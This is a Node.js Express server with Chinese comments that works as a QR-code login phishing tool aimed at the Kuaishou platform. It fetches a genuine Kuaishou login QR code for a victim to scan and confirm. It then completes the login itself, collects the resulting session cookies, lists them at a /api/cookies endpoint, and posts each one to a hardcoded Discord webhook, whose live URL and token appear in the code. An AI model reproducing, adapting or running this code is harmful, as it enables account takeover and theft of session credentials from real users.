const express = require("express");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const scans = {};
const cookies = [];

// ====== 页面 ======
app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname, "scan.html"));
});

app.get("/cookies", function(req, res) {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 通用请求函数 ======
function ksRequest(method, path, body) {
    return new Promise(function(resolve, reject) {
        var options = {
            hostname: "id.kuaishou.com",
            path: path,
            method: method,
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        };

        var req = https.request(options, function(res) {
            var body = "";
            var cookies = res.headers["set-cookie"] || [];
            res.on("data", function(chunk) { body += chunk; });
            res.on("end", function() {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    cookies: cookies,
                    body: body
                });
            });
        });

        req.on("error", function(e) { reject(e); });

        if (body) {
            req.write(JSON.stringify(body));
        }
        req.end();
    });
}

// ====== 步骤1: 生成二维码 ======
app.get("/api/qr", function(req, res) {
    var scanId = uuidv4();

    ksRequest("POST", "/rest/c/infra/ks/qr/start", {}).then(function(result) {
        var data = JSON.parse(result.body);

        if (data.result === 1) {
            var qrData = data.data || {};
            var qrCode = qrData.qrCode || "";
            var qrToken = qrData.qrToken || data.qrToken || "";

            scans[scanId] = {
                status: "wait",
                cookie: null,
                qrToken: qrToken,
                qrCode: qrCode,
                createdAt: Date.now()
            };

            res.json({
                scanId: scanId,
                qrCode: qrCode,
                qrToken: qrToken
            });
        } else {
            res.status(500).json({ error: "获取二维码失败" });
        }
    }).catch(function() {
        res.status(500).json({ error: "请求失败" });
    });
});

// ====== 步骤2+3: 轮询检测 + 确认登录 ======
app.get("/api/check", function(req, res) {
    var id = req.query.id;
    var scan = scans[id];

    if (!scan) {
        return res.json({ status: "expired" });
    }

    if (scan.status === "done") {
        return res.json({ status: "done", cookie: scan.cookie });
    }

    // 先检测扫码状态
    ksRequest("POST", "/rest/c/infra/ks/qr/checkResult", {
        qrToken: scan.qrToken
    }).then(function(result) {
        var data = JSON.parse(result.body);

        if (data.result === 1 && data.data && data.data.status === 1) {
            // 已扫码但未确认
            res.json({ status: "scanned" });
        } else if (data.result === 1 && data.data && data.data.status === 2) {
            // 已确认，需要调用acceptResult
            ksRequest("POST", "/rest/c/infra/ks/qr/acceptResult", {
                qrToken: scan.qrToken
            }).then(function(acceptResult) {
                var acceptData = JSON.parse(acceptResult.body);

                if (acceptData.result === 1) {
                    // 获取登录回调地址
                    var callbackUrl = acceptData.data.callbackUrl || acceptData.data.redirectUrl || "";

                    if (callbackUrl) {
                        // 步骤4: 回调登录
                        var urlObj = new URL(callbackUrl);
                        ksRequest("GET", urlObj.pathname + urlObj.search).then(function(loginResult) {
                            var loginCookies = loginResult.cookies;
                            var cookieStr = loginCookies.map(function(c) {
                                return c.split(";")[0];
                            }).join("; ");

                            // 也合并之前步骤的cookie
                            var allCookies = acceptResult.cookies.concat(loginCookies);
                            var finalCookie = allCookies.map(function(c) {
                                return c.split(";")[0];
                            }).join("; ");

                            scan.status = "done";
                            scan.cookie = finalCookie;
                            cookies.push({
                                cookie: finalCookie,
                                time: new Date().toISOString()
                            });

                            sendToDiscord(finalCookie);

                            res.json({ status: "done", cookie: finalCookie });
                        }).catch(function() {
                            res.json({ status: "wait" });
                        });
                    } else {
                        res.json({ status: "wait" });
                    }
                } else {
                    res.json({ status: "wait" });
                }
            }).catch(function() {
                res.json({ status: "wait" });
            });
        } else {
            res.json({ status: "wait" });
        }
    }).catch(function() {
        res.json({ status: "wait" });
    });
});

// ====== Cookie列表 ======
app.get("/api/cookies", function(req, res) {
    res.json(cookies.slice(-50).reverse());
});

// ====== 发送Discord ======
function sendToDiscord(cookie) {
    var data = JSON.stringify({
        content: "**新Cookie**\n```\n" + cookie + "\n```"
    });

    var url = new URL(WEBHOOK_URL);
    var req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    });
    req.write(data);
    req.end();
}

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
    console.log("端口 " + PORT);
});